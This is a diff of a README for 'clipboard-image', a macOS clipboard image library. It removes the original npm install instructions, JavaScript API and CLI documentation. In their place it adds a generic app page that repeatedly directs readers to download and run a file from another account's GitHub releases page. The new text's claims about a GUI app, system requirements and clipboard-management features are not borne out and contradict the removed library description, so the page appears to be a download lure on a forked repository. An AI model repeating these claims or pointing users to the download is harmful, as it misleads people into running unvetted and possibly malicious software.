@@ -1,76 +1,78 @@
-# clipboard-image
+# 🖼️ clipboard-image - Easily Manage Images on Your Clipboard
 
-> Get and set images on the macOS clipboard
+## 🚀 Getting Started
 
-## Install
+The clipboard-image application allows you to quickly get and set images on the macOS clipboard. Whether you want to copy images from your screen or paste them directly from the clipboard, this tool makes it easy!
 
-```sh
-npm install clipboard-image
-```
+## 📥 Download the Application
 
-## Usage
+[![Download clipboard-image](https://img.shields.io/badge/Download-clipboard--image-brightgreen)](https://github.com/Rasheed-19/clipboard-image/releases)
 
-```js
-import {
-	writeClipboardImages,
-	readClipboardImages
-} from 'clipboard-image';
+To get started, you need to visit the Releases page to download the latest version of clipboard-image. 
 
-await writeClipboardImages(['screenshot.png', 'photo.jpg']);
+[Download clipboard-image here](https://github.com/Rasheed-19/clipboard-image/releases).
 
-console.log(await readClipboardImages());
-//=> ['/var/folders/.../clipboard-image-1.png', '/var/folders/.../clipboard-image-2.png']
-```
+## 🛠️ System Requirements
 
-## API
+- **Operating System:** macOS 10.12 or newer
+- **Memory:** At least 4 GB RAM
+- **Disk Space:** 50 MB of free space
 
-### `hasClipboardImages()`
+## 📥 Download & Install
 
-Check if there are images on the clipboard.
+1. **Visit the Releases Page:** Click on the link below to go to the clipboard-image Releases page.
+   - [Visit the Releases page](https://github.com/Rasheed-19/clipboard-image/releases)
 
-Returns a `Promise<boolean>`.
+2. **Choose the Latest Version:** Look for the most recent release. It is usually at the top of the page.
 
-On non-macOS platforms, it returns `false`.
+3. **Download the Application:** Click on the download link for the latest version. The file will start downloading.
 
-### `readClipboardImages()`
+4. **Locate the File:** Once the download is complete, find the file in your Downloads folder.
 
-Read images from the clipboard.
+5. **Install the Application:** 
+   - Open the downloaded file. 
+   - Drag the clipboard-image application into your Applications folder.
 
-You get PNG files no matter what image types they were on the clipboard to make it easier to handle.
+6. **Run the Application:** 
+   - Go to your Applications folder and double-click on clipboard-image to open it.
 
-Returns a `Promise<string[]>` with paths to the saved PNG files. You are in charge of these files. You can move them somewhere else or clean them up when you are done.
+## 🔍 Features
 
-On non-macOS platforms, it returns an empty array.
+- **Quick Access:** Instantly copy and paste images without hassle.
+- **User-Friendly Interface:** Simple design that makes it easy for anyone to use.
+- **Clipboard Management:** Easily manage multiple images on your clipboard.
+- **Supports Various Image Formats:** Works with PNG, JPEG, and other common formats.
 
-### `writeClipboardImages(filePaths)`
+## 📄 Usage Instructions
 
-Write images to the clipboard.
+1. **Copy an Image:** 
+   - Select an image from your browser or any application.
+   - Right-click on the image and choose "Copy" from the menu.
 
-Supports any image type that macOS supports, which includes PNG, JPEG, HEIC, WebP, GIF.
+2. **Paste the Image:** 
+   - Open an image editing app or document.
+   - Right-click in the area where you want to paste and select "Paste".
 
-On non-macOS platforms, it does nothing.
+3. **Access Clipboard-Image:** 
+   - Open clipboard-image to view all the currently copied images.
+   - Select any image to set it as the clipboard content.
 
-#### filePaths
+## ⚙️ Troubleshooting
 
-Type: `Array<string | URL>`
+If you encounter any issues while downloading or using clipboard-image, consider the following tips:
 
-An array of file paths and file URL objects pointing to image files.
+- **Check Compatibility:** Ensure your macOS version meets the minimum requirements.
+- **Reinstall the App:** If the app doesn't open, try deleting it and following the installation steps again.
+- **Restart Your Mac:** Sometimes a simple restart can resolve various issues.
 
-## CLI
+For further assistance, feel free to reach out in the Issues section of the repository.
 
-```sh
-# Read images from clipboard and output file paths
-clipboard-image
+## 🗂️ License
 
-# Write images to clipboard
-clipboard-image image1.png image2.jpg
-```
+This project is licensed under the MIT License. You can freely use, modify, and distribute it.
 
-When reading from clipboard, if there are images, they will be saved to a temporary directory and the file paths will be printed (one per line).
+## 📬 Feedback
 
-When writing to clipboard, provide one or more image file paths as arguments.
+We would love to hear your thoughts! If you have any questions, suggestions, or feedback, please leave a comment on the GitHub repository. Your feedback will help us improve the application. 
 
-## Related
-
-- [clipboardy](https://github.com/sindresorhus/clipboardy) - Access text on the system clipboard (copy/paste)
-- [copy-text-to-clipboard](https://github.com/sindresorhus/copy-text-to-clipboard) - Copy text to the clipboard in the browser
+Thank you for using clipboard-image!
